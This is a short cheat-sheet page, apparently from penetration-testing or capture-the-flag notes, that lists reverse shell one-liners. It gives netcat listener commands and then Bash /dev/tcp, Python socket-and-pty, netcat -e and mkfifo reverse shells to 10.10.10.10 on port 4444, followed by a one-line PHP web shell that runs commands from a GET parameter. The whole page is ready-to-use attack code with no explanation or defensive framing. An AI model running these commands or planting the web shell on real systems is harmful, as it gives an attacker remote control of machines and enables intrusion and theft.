---
title: Reverse Shell
description: Reverse shell one-liners and techniques.
tags: [linux, reverse-shell, shells]
date: 2025-01-02
order: 2
---

## Listener

```bash
nc -lvnp 4444
rlwrap nc -lvnp 4444
```

## Bash

```bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

## Python

```python
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.10.10",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("bash")'
```

## Netcat

```bash
nc -e /bin/bash 10.10.10.10 4444
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.10.10.10 4444 >/tmp/f
```

## PHP

```php
<?php system($_GET['cmd']); ?>
```